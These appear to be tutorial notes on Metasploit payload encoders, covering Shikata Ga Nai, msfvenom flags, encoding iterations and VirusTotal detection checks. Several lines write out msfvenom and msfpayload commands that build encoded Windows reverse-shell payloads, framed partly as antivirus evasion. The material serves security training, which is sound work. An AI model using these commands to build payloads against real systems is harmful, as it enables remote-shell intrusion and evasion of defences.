## 🔐 What are Encoders?

- **Encoders** are used to:
    
    - Modify payloads to run on **different architectures**
        
    - Remove **bad characters** (e.g., `\x00`)
        
    - Help in **basic antivirus evasion**
        

✔️ Supported architectures:

- x86
    
- x64
    
- sparc
    
- ppc
    
- mips
    

👉 In simple terms:  
**Encoder = Tool that transforms payload to make it usable + less detectable**

---

## 🧠 Why Encoders are Important

- Ensure payload works across **different OS/CPU types**
    
- Avoid **bad characters** that break exploits
    
- Provide **obfuscation**
    

⚠️ Important:

- Earlier → Very useful for AV evasion
    
- Now → **Less effective due to modern AV/IDS systems**
    

---

## 🧬 Encoding Concept

![Image](https://media.springernature.com/full/springer-static/image/art%3A10.1038%2Fs41598-025-05225-4/MediaObjects/41598_2025_5225_Fig1_HTML.png)

![Image](https://breakdev.org/content/images/size/w2000/2016/05/shellcode2.png)

![Image](https://www.oreilly.com/api/v2/epubs/urn%3Aorm%3Abook%3A9781788392501/files/assets/9cb52b5d-564e-4ecc-8cc8-d7e4b725d664.png)

![Image](https://media.springernature.com/full/springer-static/image/art%3A10.1038%2Fs41598-022-13700-5/MediaObjects/41598_2022_13700_Fig1_HTML.png)

✔️ Flow:

1. Raw payload created
    
2. Encoder modifies payload
    
3. Target decodes and executes
    

---

## 🔥 Shikata Ga Nai (SGN)

- One of the **most popular encoders**
    
- Type: **Polymorphic XOR additive feedback encoder**
    
- Meaning:  
    👉 _“Nothing can be done about it”_
    

✔️ Features:

- Changes payload every time (polymorphism)
    
- Hard to detect (earlier)
    

⚠️ Today:

- Modern AV can **detect SGN easily**
    

---

## 🛠️ Old Tools (Before 2015)

### 🔹 Tools Used:

- `msfpayload` → Generate payload
    
- `msfencode` → Encode payload
    

### Example:

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

✔️ Pipe (`|`) used to:

- Pass output from payload → encoder
    

---

## 🚀 Modern Tool: msfvenom

✔️ Combines:

- Payload generation
    
- Encoding
    

---

## ⚙️ Generate Payload (Without Encoding)

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

✔️ Output:

- Raw payload (may include encoder automatically)
    

---

## 🔐 Generate Payload (With Encoding)

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

✔️ Key Flags:

- `-e` → encoder
    
- `-b` → bad characters
    
- `-f` → format
    

---

## 🔁 Multiple Encoding Iterations

```bash
-i 10
```

✔️ Example:

```bash
msfvenom ... -e x86/shikata_ga_nai -i 10
```

✔️ Purpose:

- Apply encoding **multiple times**
    

⚠️ Reality:

- Still detectable by AV
    

---

## 🧪 AV Detection Reality

### 🖼️ Antivirus Detection Concept

![Image](https://www.researchgate.net/publication/338377124/figure/fig4/AS%3A854559232626688%401580754206106/Heuristic-based-malware-detection-schema.png)

![Image](https://documentation.wazuh.com/current/_images/virustotal-remove-malware-linux-alert1.png)

![Image](https://www.researchgate.net/publication/221394408/figure/fig6/AS%3A305611540582406%401449874877298/Malware-variants-detected-by-different-antivirus-engines.png)

![Image](https://ars.els-cdn.com/content/image/1-s2.0-S2405844023107821-gr6.jpg)

✔️ Example Result:

- 54/69 engines detected payload
    
- Even after encoding → still detected
    

👉 Conclusion:  
**Encoding ≠ Guaranteed AV bypass**

---

## 📊 Using VirusTotal in Metasploit

### Command:

```bash
msf-virustotal -k <API key> -f file.exe
```

✔️ Output:

- MD5 / SHA1 / SHA256
    
- Detection ratio
    
- AV engine results
    

---

## 🧰 Show Available Encoders

```bash
show encoders
```

✔️ Example Output:

- x64/xor
    
- x64/xor_dynamic
    
- generic/none
    

---

## 📌 Encoder Compatibility

- Encoders are filtered based on:
    
    - Exploit module
        
    - Payload
        
    - Architecture
        

👉 Example:

- x64 payload → only x64 encoders shown
    

---

## 🧾 Common Encoders

- `x86/shikata_ga_nai` → polymorphic XOR
    
- `x86/countdown` → XOR countdown
    
- `x86/nonalpha` → avoids alphabetic chars
    
- `generic/none` → no encoding
    

---

## ⚠️ Important Notes (Keep These)

✔️ Encoding helps with:

- Compatibility
    
- Bad character removal
    

❌ Encoding does NOT guarantee:

- AV bypass
    

✔️ Modern security:

- Uses heuristics + behavior detection
    
- Not just signatures
    

---

## 🧠 Key Takeaways

- Encoders modify payload structure
    
- msfvenom = modern tool
    
- SGN is outdated for AV evasion
    
- Multiple encoding iterations ≠ safe
    
- Always test payload (VirusTotal / lab)
    

---

## 🧾 Summary

|Concept|Explanation|
|---|---|
|Encoder|Transforms payload|
|SGN|Popular polymorphic encoder|
|msfvenom|Payload + encoding tool|
|Iterations|Multiple encoding layers|
|AV Detection|Still high despite encoding|

---
